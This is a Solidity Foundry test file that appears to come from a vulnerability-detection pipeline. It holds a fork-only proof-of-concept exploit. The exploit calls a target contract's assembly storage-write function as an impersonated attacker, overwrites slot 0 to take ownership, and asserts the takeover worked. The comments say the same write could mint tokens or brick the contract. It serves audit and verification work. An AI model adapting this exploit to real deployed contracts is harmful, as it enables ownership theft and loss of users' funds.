// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Assembly SSTORE to a caller-chosen slot
/// @notice Detectors: assembly-sstore, assembly-param-sstore. The target
///         lets the caller pick the storage slot (or writes a fixed slot
///         from assembly) -- writing to slot 0 overwrites `owner`, to the
///         balances slot mints tokens, to the paused slot bricks the
///         contract. Storage layout is the only thing standing in the way.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: adapt writeSlot() to the target's
///      real assembly-write function, and SLOT to the layout slot.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: storage slot to overwrite (0 = owner in most contracts).
    uint256 public constant SLOT = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    function test_exploit() public {
        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        // TODO: adapt to the target's real assembly-write function.
        vm.prank(attackerEOA);
        (bool ok,) = target.call(
            abi.encodeWithSignature("writeSlot(uint256,uint256)", SLOT, uint256(uint160(attackerEOA)))
        );
        require(ok, "writeSlot call failed -- adapt to the target's assembly-write function");

        bytes32 stored = vm.load(target, bytes32(SLOT));
        console.log("slot value after write:", address(uint160(uint256(stored))));
        assertEq(
            address(uint160(uint256(stored))),
            attackerEOA,
            "exploit did not reproduce: slot was not overwritten"
        );
    }
}
